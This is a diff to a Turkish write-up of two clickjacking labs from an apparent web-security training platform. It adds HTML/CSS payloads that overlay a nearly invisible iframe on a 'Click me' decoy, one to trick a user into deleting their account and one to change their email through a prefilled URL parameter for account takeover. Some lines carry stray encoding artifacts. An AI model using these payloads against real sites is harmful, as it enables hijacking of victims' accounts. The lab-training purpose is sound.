@@ -3,7 +3,7 @@ Gelişmiş bir hijacking saldırısı kullanıcı hesabı üzerinde ciddi sorunl
 
 1
 
-Laboratuvar: CSRF token korumasÄ±yla temel clickjacking
+Laboratuvar: CSRF token korumasıyla temel clickjacking
 
 Laboratuvarı çözmek için, hesap sayfasını iframe ile çerçeveleyen ve kullanıcıyı hesabını click me ile silmeye kandıran bir HTML hazırlayın. 
 Hesap silindiğinde laboratuvar çözülmüş olur.
@@ -26,3 +26,26 @@ Delete account butonu üzerine css özelliklerini kullanarak konuşlandırdığ�
 </style>
 <div>Click me</div>
 <iframe src="https://$yourlabid.web-security-academy.net/my-account"></iframe>
+
+2
+Email adresini istediğimiz bir email adresi olarak değiştirebiliyoruz. Etkisi hesap devralmaya yol açabilir.
+Laboratuvar: URL parametresinden önceden doldurulmuş form giriş verileriyle clickjacking
+Mail adresini aşağıdaki kod satırlarıyla değiştirebildiğimiz anda lab çözülüyor.
+
+<style>
+    iframe {
+        position:relative;
+        width:700px;
+        height: 500px;
+        opacity: 0.01;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:450px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://$║yourlabid.web-security-academy.net/my-account?email=hacker4@hacker.co"></iframe>
